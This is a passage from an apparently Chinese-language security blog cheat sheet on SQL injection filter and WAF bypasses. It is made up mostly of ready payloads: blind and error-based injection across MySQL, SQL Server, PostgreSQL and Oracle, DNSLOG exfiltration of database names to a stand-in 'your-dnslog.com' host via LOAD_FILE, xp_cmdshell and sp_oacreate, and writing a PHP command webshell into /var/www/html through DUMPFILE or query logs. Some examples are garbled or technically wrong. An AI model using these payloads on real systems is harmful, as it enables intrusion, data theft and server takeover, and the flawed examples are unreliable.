<li><p>如果前端的输入是 <code>1\&#39;</code>， <code>addslashes</code> 会将 <code>\&#39;</code> 变为 <code>\\&#39;</code><br>这个方法需要深入理解后端如何处理输入。如果后端代码只对单引号进行了转义，而没有对反斜线进行处理，你就可以用一个反斜线来闭合它</p>
</li>
</ol>
<h5 id="char-函数绕过"><a href="#char-函数绕过" class="headerlink" title="char()函数绕过"></a>char()函数绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char()` 函数可以将数字转换为字符。你可以利用这个函数来构造单引号</span><br><span class="line">**注入尝试：** `id=1 and 1=1 and (select char(39))` `id=1 union select 1,2,3 from users where username=char(39)adminchar(39)</span><br></pre></td></tr></table></figure>

<h5 id="使用like语句绕过"><a href="#使用like语句绕过" class="headerlink" title="使用like语句绕过"></a>使用like语句绕过</h5><p>在某些盲注场景下，如果无法使用单引号，可以尝试使用 <code>like</code> 语句来代替 <code>union</code> 或 <code>and</code><br><strong>注入尝试：</strong> <code>id=1 and 1 like 1 and 1=1 --</code> <code>id=1 and 1 like database()</code><br>这种方法适用于特定的 SQL 语句结构，但并非万能</p>
<h4 id="盲注过滤if绕过手法"><a href="#盲注过滤if绕过手法" class="headerlink" title="盲注过滤if绕过手法"></a>盲注过滤if绕过手法</h4><p><strong>1. 利用</strong> <code>CASE WHEN</code> <strong>语句</strong><br><code>CASE WHEN</code> 语句是 SQL 中最常见的条件判断表达式，其功能与 <code>IF()</code> 函数非常相似，且通常不会被安全设备过滤</p>
<ul>
<li><p><strong>语法：</strong> <code>CASE WHEN [condition] THEN [value1] ELSE [value2] END</code></p>
</li>
<li><p><strong>布尔盲注绕过：</strong> <code>SELECT * FROM users WHERE id = 1 AND CASE WHEN (1=1) THEN 1 ELSE 2 END = 1</code></p>
</li>
<li><p><strong>时间盲注绕过：</strong> <code>SELECT * FROM users WHERE id = 1 AND CASE WHEN (SUBSTRING(database(),1,1) = &#39;d&#39;) THEN SLEEP(5) ELSE 0 END</code></p>
</li>
</ul>
<p><strong>2. 利用</strong> <code>UNION</code> <strong>+ 错误信息</strong><br>当 <code>IF()</code> 被过滤，但 <code>UNION</code> 和错误信息回显没有被完全禁用时，我们可以利用 <code>UNION</code> 来触发自定义的错误信息，从而进行布尔盲注</p>
<ul>
<li><p><strong>原理：</strong> 通过 <code>UNION</code> 将一个错误的查询结果与正常的查询结果合并，当错误的查询语句执行时，数据库会返回错误信息，其中可能包含我们想要的数据</p>
</li>
<li><p><strong>绕过方式：</strong> <code>SELECT * FROM users WHERE id = -1 UNION SELECT 1, 2, 3 FROM DUAL WHERE (1=2) OR (1=1) UNION SELECT 1, 2, 3 FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)a</code> 这个方法需要根据具体情况进行调整，利用数据库的语法错误或类型转换错误来触发自定义的错误信息</p>
</li>
</ul>
<p><strong>3. 利用位运算和</strong> <code>LIKE</code> <strong>语句</strong><br>当数据库不支持 <code>IF()</code> 或 <code>CASE</code> 语句时，我们可以利用逻辑运算和位运算来逐位判断数据</p>
<ul>
<li><p><strong>原理：</strong> <code>LIKE</code> 语句可以用于模糊匹配，我们可以将它和数据库中的数据结合起来，逐个字符地猜解</p>
</li>
<li><p><strong>绕过方式：</strong> <code>SELECT * FROM users WHERE id = 1 AND username LIKE &#39;a%&#39;</code> 如果该查询返回结果，则说明 <code>username</code> 的第一个字符是 ‘a’。我们可以通过不断改变 <code>%</code> 前的字符来逐个猜解数据</p>
</li>
</ul>
<p><strong>4. 利用</strong> <code>benchmark()</code> <strong>函数</strong><br>在 MySQL 中，<code>benchmark()</code> 函数可以用来执行指定的函数多次，从而消耗大量时间。这可以用来替代 <code>SLEEP()</code> 函数进行时间盲注</p>
<ul>
<li><p><strong>原理：</strong> <code>BENCHMARK(count, expr)</code> 会重复执行 <code>expr</code> 表达式 <code>count</code> 次。如果 <code>expr</code> 包含一个耗时的操作，我们可以根据执行时间来判断条件是否成立</p>
</li>
<li><p><strong>绕过方式：</strong> <code>SELECT * FROM users WHERE id = 1 AND BENCHMARK(10000000, MD5(1)) AND (SUBSTRING(database(),1,1) = &#39;d&#39;)</code></p>
</li>
</ul>
<p>如果条件 <code>(SUBSTRING(database(),1,1) = &#39;d&#39;)</code> 成立，<code>BENCHMARK</code> 函数就会被执行，页面响应会变慢。否则，页面会立即响应</p>
<p><strong>5. 利用</strong> <code>get_lock()</code> <strong>函数</strong><br>在 MySQL 中，<code>GET_LOCK()</code> 函数可以用于获取一个全局锁，如果锁已被其他会话占用，该函数会等待直到锁被释放或超时</p>
<ul>
<li><p><strong>原理：</strong> 我们可以利用 <code>GET_LOCK()</code> 函数设置一个长达数秒的锁，从而实现时间盲注的效果</p>
</li>
<li><p><strong>绕过方式：</strong> <code>SELECT * FROM users WHERE id = 1 AND IF((SUBSTRING(database(),1,1)=&#39;d&#39;), GET_LOCK(&#39;hack&#39;, 5), 0)</code><br>如果条件成立，<code>GET_LOCK</code> 会被执行，页面会等待 5 秒</p>
</li>
</ul>
<p><strong>6. 利用</strong> <code>ELT()</code> <strong>函数</strong><br><code>ELT()</code> 函数是 MySQL 中的一个字符串函数，它可以根据索引返回列表中的一个字符串</p>
<ul>
<li><p><strong>原理：</strong> <code>ELT(N, str1, str2, ...)</code> 返回第 N 个字符串。我们可以将它与条件判断结合，实现布尔盲注</p>
</li>
<li><p><strong>绕过方式：</strong> <code>SELECT * FROM users WHERE id = 1 AND ELT(1, &#39;false&#39;, &#39;true&#39;)</code> 如果条件为真，<code>ELT</code> 会返回 <code>true</code>，否则返回 <code>false</code></p>
</li>
</ul>
<h4 id="and和or被过滤怎么绕过"><a href="#and和or被过滤怎么绕过" class="headerlink" title="and和or被过滤怎么绕过"></a>and和or被过滤怎么绕过</h4><h5 id="和"><a href="#和" class="headerlink" title="&amp;&amp;和||"></a>&amp;&amp;和||</h5><p><code>&amp;&amp;</code>和<code>||</code>和功能一样的</p>
<h5 id="利用-、、not-等操作符"><a href="#利用-、、not-等操作符" class="headerlink" title="利用!、&lt;&gt;、not 等操作符"></a>利用<code>!</code>、<code>&lt;&gt;</code>、<code>not</code> 等操作符</h5><ul>
<li><p><code>and</code> <strong>的替代：</strong></p>
</li>
<li><p><code>if not (a=1) then ...</code> 等价于 <code>if a&lt;&gt;1 then ...</code></p>
</li>
<li><p>我们可以利用 <code>not</code> 或 <code>&lt;&gt;</code> 来否定条件，从而实现 <code>and</code> 的效果</p>
</li>
<li><p><strong>例如：</strong> <code>username=admin&#39; or not (&#39;1&#39;=&#39;1&#39; and &#39;1&#39;=&#39;2&#39;)</code> 这句可以被改写为 <code>username=admin&#39; or not (1=1)</code>，这在逻辑上是错误的，我们可以利用它来测试</p>
</li>
<li><p><strong>更具体的绕过：</strong> <code>id=1 and 1=2</code> 可以被改写为 <code>id=1 or not 1=1</code>，这在布尔盲注中可以用来判断</p>
</li>
</ul>
<h5 id="利用union-select进行盲注"><a href="#利用union-select进行盲注" class="headerlink" title="利用union select进行盲注"></a>利用<code>union select</code>进行盲注</h5><p>当布尔条件失效时，可以尝试使用 <code>union select</code> 来进行盲注</p>
<ul>
<li><p><strong>原理：</strong></p>
</li>
<li><p>正常情况下，<code>union select</code> 需要前后两个查询的列数一致</p>
</li>
<li><p>我们可以利用这一点，通过 <code>union select</code> 来注入一个不存在的列，从而触发数据库的报错，通过报错信息来判断</p>
</li>
<li><p><strong>绕过方式：</strong></p>
</li>
<li><p><strong>首先，使用</strong> <code>union</code> <strong>探测列数。</strong> <code>id=1 union select 1,2,3...</code></p>
</li>
<li><p><strong>然后，利用列数来进行盲注。</strong> <code>id=-1 union select 1, 2, user() like &#39;root%&#39;</code> 如果页面正常回显，则说明 <code>user()</code> 以 <code>root</code> 开头。通过这种方式，可以逐字逐句地猜解数据</p>
</li>
</ul>
<h5 id="利用if-函数的替代品"><a href="#利用if-函数的替代品" class="headerlink" title="利用if()函数的替代品"></a>利用<code>if()</code>函数的替代品</h5><p>在布尔盲注中，<code>if()</code> 函数通常是不可或缺的。如果它和 <code>and</code> <code>or</code> 一起被过滤，那么需要寻找替代函数</p>
<ul>
<li><p><code>case when ... then ... end</code><strong>：</strong> 这是 <code>if()</code> 函数最常见的替代品，功能完全一样，且通常不会被过滤</p>
</li>
<li><p><strong>例如：</strong> <code>id=1 and (case when 1=1 then sleep(5) else 0 end)</code></p>
</li>
<li><p><strong>绕过：</strong> <code>id=1 or (case when (database() like &#39;d%&#39;) then sleep(5) else 0 end)</code></p>
</li>
<li><p><code>greatest()</code> <strong>和</strong> <code>least()</code><strong>：</strong> 这两个函数返回一组值中的最大值和最小值。我们可以利用它们来构造条件判断</p>
</li>
<li><p><strong>例如：</strong> <code>id=1 and greatest(1, (select if(1=1, 0, 1)))</code></p>
</li>
<li><p><strong>绕过：</strong> <code>id=1 or greatest(ascii(substr(database(),1,1)), 100)&gt;100</code></p>
</li>
</ul>
<h5 id="利用其他查询特性"><a href="#利用其他查询特性" class="headerlink" title="利用其他查询特性"></a>利用其他查询特性</h5><p>当所有常用方法都被过滤时，可以尝试利用一些非常规的查询特性<br><code>having</code> <strong>子句：</strong> <code>having</code> 用于对 <code>group by</code> 的结果进行过滤。在一些情况下，<code>having</code> 后面可以接子查询，可以利用这一点进行注入<br><code>limit offset</code><strong>：</strong> 我们可以通过 <code>limit</code> 和 <code>offset</code> 来逐行读取数据，再结合其他技术进行判断</p>
<h4 id="SQL注入无回显利用DNSLOG如何构造"><a href="#SQL注入无回显利用DNSLOG如何构造" class="headerlink" title="SQL注入无回显利用DNSLOG如何构造"></a>SQL注入无回显利用DNSLOG如何构造</h4><h5 id="MySQL-MariaDB"><a href="#MySQL-MariaDB" class="headerlink" title="MySQL&#x2F;MariaDB"></a>MySQL&#x2F;MariaDB</h5><h6 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a>load_file</h6><p>在 MySQL 和 MariaDB 中，<code>LOAD_FILE()</code> 函数和 <code>UNC</code> 路径（Windows 共享路径）是触发 DNS 查询的常用手段<br>LOAD_FILE()<br>用于读取文件内容，如果给一个UNC路劲，他会触发DNS查询<br>payload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">SELECT</span> DATABASE()),<span class="string">&#x27;.your-dnslog.com\\a&#x27;</span>));</span><br><span class="line"></span><br><span class="line">`<span class="keyword">SELECT</span> DATABASE()`：获取当前数据库名</span><br><span class="line">    </span><br><span class="line">`CONCAT(...)`：将数据库名与你的 DNSlog 域名拼接成一个新的域名，例如 `testdb.your<span class="operator">-</span>dnslog.com`</span><br><span class="line">    </span><br><span class="line">`LOAD_FILE()`：尝试加载这个 UNC 路径，由于域名不存在本地，它会发起 DNS 查询</span><br><span class="line">    </span><br><span class="line">`\\a`：这是一个占位符，用于避免语法错误</span><br></pre></td></tr></table></figure>

<h6 id="dns-reverse-和benchmark"><a href="#dns-reverse-和benchmark" class="headerlink" title="dns_reverse()和benchmark()"></a>dns_reverse()和benchmark()</h6><p>需要 MySQL 5.7.10 或更高版本，且安装了 <code>sys</code> 模式</p>
<ul>
<li><p><strong>Payload 构造：</strong> <code>SELECT BENCHMARK(1000000,MD5(CONCAT(&#39;a&#39;,(SELECT DATABASE())))) AND (SELECT sys.version_get_option(&#39;version&#39;) LIKE &#39;%DNS%&#39;);</code></p>
</li>
<li><p>注意：这个方法主要是为了演示 <code>sys</code> 库的功能，实际操作中 <code>LOAD_FILE</code> 更常见</p>
</li>
</ul>
<h5 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h5><p>在 SQL Server 中，我们可以利用 <code>xp_cmdshell</code> 或 <code>sp_oacreate</code> 来触发 DNS 查询<br><strong>利用</strong> <code>xp_cmdshell</code><br><code>xp_cmdshell</code> 是一个强大的存储过程，可以执行系统命令。我们可以利用 <code>ping</code> 命令来触发 DNS 查询</p>
<ul>
<li><p><strong>Payload 构造：</strong> <code>EXEC xp_cmdshell &#39;ping -n 1 &#39; + (SELECT TOP 1 CAST(name AS VARCHAR(255)) FROM sys.databases) + &#39;.your-dnslog.com&#39;;</code></p>
</li>
<li><p><strong>解释：</strong></p>
</li>
<li><p><code>xp_cmdshell</code>：执行 <code>ping</code> 命令</p>
</li>
<li><p><code>SELECT TOP 1 CAST(name AS VARCHAR(255)) FROM sys.databases</code>：获取第一个数据库的名称</p>
</li>
<li><p><code>+</code>：将数据库名与你的 DNSlog 域名拼接</p>
</li>
</ul>
<p><strong>利用</strong> <code>sp_oacreate</code><br><code>sp_oacreate</code> 可以创建 OLE 对象，我们可以利用它来发起 HTTP 请求，从而触发 DNS 查询</p>
<ul>
<li><strong>Payload 构造：</strong> <code>DECLARE @h INT; EXEC sp_oacreate &#39;WinHttp.WinHttpRequest.5.1&#39;, @h OUT; EXEC sp_oamethod @h, &#39;Open&#39;, NULL, &#39;GET&#39;, &#39;http://&#39; + (SELECT TOP 1 CAST(name AS VARCHAR(255)) FROM sys.databases) + &#39;.your-dnslog.com&#39;;</code></li>
</ul>
<h5 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h5><p>在 PostgreSQL 中，<code>COPY</code> 命令和 <code>pg_sleep</code> 结合可以实现 DNSlog。但更直接的方法是利用 <code>pg_send_query</code> 或 <code>UDF</code>（用户定义函数）。</p>
<ul>
<li><p><strong>Payload 构造：</strong> <code>SELECT * FROM users WHERE id = 1 AND (SELECT pg_send_query(&#39;SELECT * FROM &#39; || (SELECT version()) || &#39;.your-dnslog.com&#39;)) IS NOT NULL;</code></p>
</li>
<li><p><strong>解释：</strong></p>
</li>
<li><p><code>pg_send_query()</code>：用于发送一个查询。</p>
</li>
<li><p><code>(SELECT version())</code>：获取 PostgreSQL 的版本信息。</p>
</li>
<li><p>这个方法利用了 PostgreSQL 在解析域名时会触发 DNS 查询的特性</p>
</li>
</ul>
<h4 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h4><p>在显示位上替换为常见的注入变量或其它语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)B <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)C）;</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> dual <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span> <span class="keyword">from</span> dual <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">3</span> <span class="keyword">from</span> dual;</span><br><span class="line"># dual是 MySQL<span class="operator">/</span>Oracle 的虚拟表（PostgreSQL 可省略，<span class="keyword">SQL</span> Server 用sysobjects替代），用于无实际表时的 <span class="keyword">SELECT</span> 查询；</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span> <span class="keyword">offset</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">3</span> <span class="keyword">offset</span> <span class="number">0</span>;</span><br><span class="line"># <span class="keyword">OFFSET</span>关键字（适配无dual的场景）</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>) t1 <span class="keyword">cross</span> <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>) t2 <span class="keyword">cross</span> <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>) t3;</span><br><span class="line">#<span class="keyword">JOIN</span>（复杂但绕WAF效果好）</span><br><span class="line"> </span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)B <span class="keyword">join</span> (<span class="keyword">select</span> group_concat(<span class="keyword">user</span>(),<span class="string">&#x27; &#x27;</span>,database(),<span class="string">&#x27; &#x27;</span>,@<span class="variable">@datadir</span>))C);</span><br></pre></td></tr></table></figure>

<h4 id="SQL-延时盲注-sleep-被禁用怎么绕过"><a href="#SQL-延时盲注-sleep-被禁用怎么绕过" class="headerlink" title="SQL 延时盲注 sleep() 被禁用怎么绕过"></a>SQL 延时盲注 sleep() 被禁用怎么绕过</h4><p><strong>1. 利用 BENCHMARK() 函数</strong><br><code>BENCHMARK()</code> 函数是 MySQL 中一个非常有用的性能测试函数。它的作用是让一个函数重复执行多次，并返回执行时间。我们可以利用这个特性来造成可控的延时</p>
<ul>
<li><p><strong>原理:</strong> <code>BENCHMARK(count, expr)</code> 会让 <code>expr</code> 表达式执行 <code>count</code> 次。如果我们让它执行一个耗时但无害的操作，就可以造成明显的延时</p>
</li>
<li><p><strong>基本语法:</strong> <code>BENCHMARK(count, expr)</code></p>
</li>
<li><p><strong>利用方式:</strong></p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 让 MD5(<span class="string">&#x27;a&#x27;</span>) 重复执行 <span class="number">5</span>,<span class="number">000</span>,<span class="number">000</span> 次，从而造成延时   </span><br><span class="line"><span class="keyword">AND</span> IF(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>, BENCHMARK(<span class="number">5000000</span>, MD5(<span class="string">&#x27;a&#x27;</span>)), <span class="number">1</span>)   </span><br></pre></td></tr></table></figure>

<p><strong>解释:</strong></p>
<ul>
<li><p><code>IF(condition, true_value, false_value)</code>：这是一个条件判断语句</p>
</li>
<li><p><code>ascii(substr(database(),1,1))=115</code>：这是我们的注入条件，判断数据库名的第一个字符的 ASCII 值是否为 115（即 <code>&#39;s&#39;</code>）</p>
</li>
<li><p>如果条件为真，<code>BENCHMARK()</code> 函数被执行，导致页面延迟；如果条件为假，则立即返回 <code>1</code>，页面没有延迟</p>
</li>
</ul>
<p><strong>2. 利用 GET_LOCK() 函数</strong><br><code>GET_LOCK()</code> 函数是 MySQL 中的一个锁函数。它可以获取一个指定的锁，并在指定的超时时间内等待。如果锁被其他会话占用，它就会一直等待直到超时。我们可以利用这个特性来造成延时</p>
<ul>
<li><p><strong>原理:</strong> <code>GET_LOCK(str, timeout)</code> 函数尝试获取一个名为 <code>str</code> 的锁，并等待 <code>timeout</code> 秒</p>
</li>
<li><p><strong>利用方式:</strong></p>
</li>
</ul>
<p>`&#96;&#96;sql   # 如果条件为真，则获取一个名为 ‘a’ 的锁并等待 5 秒   AND IF(ascii(substr(database(),1,1))&#x3D;115, GET_LOCK(‘a’, 5), 1)   &#96;&#96;&#96;<br>这种方法的缺点是，如果多个请求同时执行，可能会因为锁竞争而造成不可预知的行为</p>
<p><strong>3. 利用 RLIKE&#x2F;REGEXP 的正则特性</strong><br>当使用 <code>RLIKE</code> 或 <code>REGEXP</code> 进行正则表达式匹配时，如果正则表达式足够复杂，并且目标字符串足够长，也会造成明显的性能消耗，从而实现延时效果</p>
<ul>
<li><p><strong>原理:</strong> 构造一个回溯（backtracking）量较大的正则表达式，让 MySQL 在匹配时消耗大量 CPU 资源</p>
</li>
<li><p><strong>利用方式:</strong></p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 构造一个高回溯的正则表达式来消耗 CPU   </span><br><span class="line"><span class="keyword">AND</span> IF(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>, (<span class="keyword">SELECT</span> concat(rpad(<span class="string">&#x27;&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="string">&#x27;&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>),<span class="string">&#x27;a&#x27;</span>) RLIKE <span class="string">&#x27;(a.*)+(a.*)+&#x27;</span>), <span class="number">1</span>)   </span><br></pre></td></tr></table></figure>



<p><strong>解释:</strong> <code>rpad()</code> 函数用于填充字符串，使其变得很长。<code>RLIKE &#39;(a.*)+(a.*)+&#39;</code> 是一个典型的回溯型正则表达式。当字符串很长时，匹配会非常耗时</p>
<p><strong>4. 利用笛卡尔积</strong></p>
<p>通过制造一个巨大的笛卡尔积，可以使查询的执行时间大大增加</p>
<ul>
<li><p><strong>原理:</strong> 当两个大表没有关联地进行连接时，结果集的行数是两个表行数的乘积</p>
</li>
<li><p><strong>利用方式:</strong></p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用 information_schema.tables 来制造一个笛卡尔积   </span><br><span class="line"><span class="keyword">AND</span> IF(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>, (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.tables a, information_schema.columns b), <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>这种方法同样会造成明显的延迟，但查询结果可能会占用大量内存</p>
<h4 id="outfile被过滤怎么绕"><a href="#outfile被过滤怎么绕" class="headerlink" title="outfile被过滤怎么绕"></a>outfile被过滤怎么绕</h4><h5 id="dumpfile"><a href="#dumpfile" class="headerlink" title="dumpfile()"></a>dumpfile()</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h5 id="利用日志文件"><a href="#利用日志文件" class="headerlink" title="利用日志文件"></a>利用日志文件</h5><p>如果数据库开启了通用查询日志（<code>general_log</code>）或者慢查询日志（<code>slow_query_log</code>），并且你有权限修改日志路径，那么可以利用这个特性来写入 Webshell</p>
<ul>
<li><p><strong>步骤</strong>：</p>
</li>
<li><p><strong>设置日志文件路径</strong>：将 <code>general_log_file</code> 或 <code>slow_query_log_file</code> 的值修改为 Web 目录下的一个可写路径，例如 <code>/var/www/html/shell.php</code></p>
</li>
<li><p><strong>开启日志</strong>：将 <code>general_log</code> 或 <code>slow_query_log</code> 设为 <code>ON</code></p>
</li>
<li><p><strong>写入恶意代码</strong>：执行一个包含 Webshell 代码的查询，例如 <code>SELECT &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</code>。这条查询语句会被写入到日志文件中，从而创建 Webshell</p>
</li>
</ul>
<p>使用+号替代空格：例如，union+select+1,2,3。<br>URL编码替代：%20（空格）、%09（水平制表符HT）、%0A（换行符LF）、%0C（换页符FF）、%0D（回车CR）、%0B（垂直制表符VT）、%A0（不间断空格NBS）。<br>使用SQL注释符&#x2F;<strong>&#x2F;替代空格，如：union&#x2F;</strong>&#x2F;select。<br>括号()替代空格：select(database())。<br>使用报错注入技巧绕过限制。</p>
<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p><strong>MySQL</strong></p>
<table>
<thead>
<tr>
<th>函数&#x2F;方法</th>
<th>利用原理</th>
<th>举例</th>
</tr>
</thead>
<tbody><tr>
<td>updatexml()</td>
<td>修改 XML 文档，不合法的 XPath 路径会报错并显示内容</td>
<td>… AND updatexml(1,concat(0x7e, (SELECT database()), 0x7e),1)</td>
</tr>
<tr>
<td>extractvalue()</td>
<td>从 XML 字符串提取值，不合法的 XPath 路径会报错并显示内容</td>
<td>… AND extractvalue(1, concat(0x7e, (SELECT user())))</td>
</tr>
<tr>
<td>floor()</td>
<td>结合 GROUP BY 和 rand()，制造重复键错误，将数据作为键值显示</td>
<td>… AND (SELECT 1 FROM (SELECT count(), concat(database(),floor(rand(0)2))x FROM information_schema.tables GROUP BY x)a)</td>
</tr>
<tr>
<td>name_const()</td>
<td>用于创建一个带名称的匿名列。当在子查询中，我们使用 <code>NAME_CONST()</code> 将查询结果作为列名，并且这个列名在子查询中已经存在时，就会引发一个“重复列名”的错误，并将查询结果显示出来</td>
<td>AND (SELECT 1 FROM (SELECT count(), concat(database(),floor(rand(0)2))x FROM information_schema.tables GROUP BY x)a)</td>
</tr>
<tr>
<td>exp()</td>
<td>我们可以通过 <code>~</code> 按位取反操作，将一个大的负数转换成一个巨大的正数，从而触发溢出</td>
<td>AND (exp(~(SELECT * FROM (SELECT database())x)))</td>
</tr>
</tbody></table>
<p><strong>SQL Server</strong></p>
<table>
<thead>
<tr>
<th>函数&#x2F;方法</th>
<th>利用原理</th>
<th>举例</th>
</tr>
</thead>
<tbody><tr>
<td>convert() &#x2F; cast()</td>
<td>强制类型转换，将非数字字符串转换为整型会报错并显示字符串内容</td>
<td>… AND 1&#x3D;convert(int,(SELECT db_name()))</td>
</tr>
</tbody></table>
<p><strong>PostgreSQL</strong></p>
<table>
<thead>
<tr>
<th>函数&#x2F;方法</th>
<th>利用原理</th>
<th>举例</th>
</tr>
</thead>
<tbody><tr>
<td>cast()</td>
<td>强制类型转换，将字符串转换为不兼容的数据类型时报错</td>
<td>… AND 1&#x3D;CAST((SELECT version()) as int)</td>
</tr>
</tbody></table>
<p><strong>Oracle</strong></p>
<table>
<thead>
<tr>
<th>函数&#x2F;方法</th>
<th>利用原理</th>
<th>举例</th>
</tr>
</thead>
<tbody><tr>
<td>utl_inaddr.get_host_address()</td>
<td>utl_inaddr.get_host_address() 会将不合法的IP地址或域名作为错误信息的一部分</td>
<td>… AND 1&#x3D;(SELECT utl_inaddr.get_host_address((SELECT user FROM dual)))</td>
</tr>
<tr>
<td>ctxsys.drithsx.sn()</td>
<td>在执行 ctxsys.drithsx.sn() 函数时，不合法的参数会引发错误并显示内容</td>
<td>… AND 1&#x3D;ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’))</td>
</tr>
<tr>
<td>dbms_utility.sqlcode_to_char()</td>
<td>这个函数用于将错误代码转换为字符。它本身不是用来报错的，但可以和其他会报错的函数结合使用</td>
<td>AND 1&#x3D;TO_NUMBER((SELECT ‘a’</td>
</tr>
</tbody></table>
<h2 id="SQL注入写shell"><a href="#SQL注入写shell" class="headerlink" title="SQL注入写shell"></a>SQL注入写shell</h2><p><strong>条件</strong><br><strong>权限</strong>：具备 <code>File</code> 权限，或者说有权限执行 <code>LOAD_FILE()</code>、<code>INTO OUTFILE</code> 或 <code>INTO DUMPFILE</code> 等文件操作函数<br><strong>目标路径可写</strong>：网站服务器上的目标路径必须是可写的，且不能被权限系统限制<br><strong>WAF 或防护软件</strong>：没有强大的 WAF (Web Application Firewall) 或其他安全软件拦截注入语句</p>
<p><strong>1. MySQL：</strong><code>INTO OUTFILE</code></p>
<p><code>INTO OUTFILE</code> 语句能够将查询结果导出到一个指定的文件中<br><strong>利用步骤：</strong><br><strong>判断权限</strong>：首先，需要判断当前数据库用户是否具有 <code>File</code> 权限。可以尝试执行以下语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND (SELECT count(*) FROM mysql.user)&gt;0--+</span></span><br></pre></td></tr></table></figure>

<p>如果返回正常，则可以初步判断有权限。更直接的方式是尝试利用 <code>@@basedir</code> 或 <code>@@datadir</code> 查看路径是否可写</p>
<ol>
<li><strong>获取网站绝对路径</strong>：如果不知道网站的绝对路径，可以尝试利用报错或联合查询来获取</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 利用报错获取   </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND (SELECT 1 FROM (SELECT count(*), concat(@@basedir,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--+</span></span><br></pre></td></tr></table></figure>

<p>或者尝试猜测一些常见的路径，例如 <code>/var/www/html/</code>、<code>C:/inetpub/wwwroot/</code> 等</p>
<p><strong>构造注入语句</strong>：将包含 WebShell 代码的字符串作为查询结果，然后使用 <code>INTO OUTFILE</code> 导出到目标路径</p>
